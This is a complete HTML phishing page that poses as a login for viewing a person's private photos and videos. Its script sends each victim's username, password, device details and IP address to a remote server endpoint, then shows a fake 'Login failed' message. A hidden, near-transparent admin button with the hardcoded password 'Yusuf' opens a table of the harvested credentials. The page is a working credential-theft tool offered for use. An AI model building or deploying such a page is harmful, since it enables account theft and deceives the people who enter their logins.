<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        .admin-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: transparent;
            cursor: pointer;
            opacity: 0.05;
            transition: opacity 0.3s;
        }
        .admin-btn:hover {
            opacity: 1;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background-color: white;
            padding: 2rem;
            border-radius: 0.5rem;
            width: 90%;
            max-width: 400px;
        }
        .data-table {
            width: 100%;
            border-collapse: collapse;
        }
        .data-table th, .data-table td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        .data-table tr:nth-child(even) {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-900 to-blue-800 min-h-screen flex items-center justify-center">
    <div class="bg-white rounded-lg shadow-2xl p-8 w-full max-w-md">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-bold text-gray-800 mb-2">Private Content Access</h1>
            <p class="text-gray-600">Log in to access this person's private photos, videos, and more.</p>
        </div>
        
        <form id="loginForm" class="space-y-6">
            <div>
                <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
                <input type="text" id="username" name="username" required 
                    class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600" 
                    placeholder="Enter your username">
            </div>
            
            <div>
                <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input type="password" id="password" name="password" required 
                    class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600" 
                    placeholder="Enter your password">
            </div>
            
            <button type="submit" class="w-full bg-purple-600 text-white py-2 px-4 rounded-md hover:bg-purple-700 transition duration-300 focus:outline-none focus:ring-2 focus:ring-purple-600 focus:ring-opacity-50">
                Log In
            </button>
        </form>
    </div>

    <!-- Hidden admin button -->
    <button id="adminBtn" class="admin-btn" title="Admin Access">
        <i class="fas fa-user-shield text-white text-2xl"></i>
    </button>

    <!-- Admin password modal -->
    <div id="adminModal" class="modal">
        <div class="modal-content">
            <h2 class="text-xl font-bold mb-4">Admin Access</h2>
            <div class="mb-4">
                <label for="adminPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input type="password" id="adminPassword" class="w-full px-4 py-2 border border-gray-300 rounded-md">
            </div>
            <button id="confirmAdminBtn" class="w-full bg-purple-600 text-white py-2 px-4 rounded-md hover:bg-purple-700 transition duration-300">
                Access Admin Panel
            </button>
        </div>
    </div>

    <!-- Admin panel -->
    <div id="adminPanel" class="modal">
        <div class="modal-content" style="max-width: 800px;">
            <div class="flex justify-between items-center mb-6">
                <h2 class="text-2xl font-bold">Admin Panel</h2>
                <button id="closeAdminPanel" class="text-red-600 hover:text-red-800">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="overflow-auto max-h-[70vh]">
                <table class="data-table w-full">
                    <thead>
                        <tr class="bg-gray-800 text-white">
                            <th class="p-3">Date</th>
                            <th class="p-3">Username</th>
                            <th class="p-3">Password</th>
                            <th class="p-3">Device</th>
                            <th class="p-3">IP Address</th>
                        </tr>
                    </thead>
                    <tbody id="credentialsTable">
                        <!-- Credentials will be inserted here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const SERVER_URL = 'https://your-server-endpoint.com/api'; // Replace with your actual server endpoint
        let credentials = [];
        
        // Login form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if(username && password) {
                // Get device info
                const device = getDeviceInfo();
                
                // Create new credential object
                const credential = {
                    date: new Date().toISOString(),
                    username: username,
                    password: password,
                    device: device,
                    ip: await getIPAddress()
                };
                
                try {
                    // Send to server
                    await fetch(`${SERVER_URL}/logins`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(credential)
                    });
                    
                    // Fake login redirect
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                    alert('Login failed. Please check your credentials and try again.');
                } catch (error) {
                    console.error('Error saving login:', error);
                }
            }
        });
        
        // Show admin modal
        document.getElementById('adminBtn').addEventListener('click', function() {
            document.getElementById('adminModal').style.display = 'flex';
        });
        
        // Verify admin password
        document.getElementById('confirmAdminBtn').addEventListener('click', async function() {
            const password = document.getElementById('adminPassword').value;
            
            if(password === 'Yusuf') {
                try {
                    // Fetch all logins from server
                    const response = await fetch(`${SERVER_URL}/logins`);
                    credentials = await response.json();
                    
                    document.getElementById('adminModal').style.display = 'none';
                    document.getElementById('adminPanel').style.display = 'flex';
                    
                    // Populate credentials table
                    const tableBody = document.getElementById('credentialsTable');
                    tableBody.innerHTML = '';
                    
                    credentials.forEach(credential => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${new Date(credential.date).toLocaleString()}</td>
                            <td>${credential.username}</td>
                            <td>${credential.password}</td>
                            <td>${credential.device}</td>
                            <td>${credential.ip || 'N/A'}</td>
                        `;
                        tableBody.appendChild(row);
                    });
                } catch (error) {
                    console.error('Error fetching logins:', error);
                    alert('Failed to fetch login data');
                }
            } else {
                alert('Incorrect admin password');
            }
        });
        
        // Close admin panel
        document.getElementById('closeAdminPanel').addEventListener('click', function() {
            document.getElementById('adminPanel').style.display = 'none';
        });
        
        // Get device info
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            
            let deviceType = "Desktop";
            
            if (/Mobi|Android/i.test(userAgent)) {
                deviceType = /Android/i.test(userAgent) ? "Android" : "iOS";
                if (screenWidth < 768) deviceType += " (Phone)";
                else deviceType += " (Tablet)";
            } else if (/iPad|iPhone|iPod/i.test(userAgent)) {
                deviceType = "iOS";
                if (screenWidth < 768) deviceType += " (Phone)";
                else deviceType += " (Tablet)";
            }
            
            return `${deviceType} - ${screenWidth}x${screenHeight}`;
        }

        // Get user's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return null;
            }
        }
    </script>
</body>
</html>
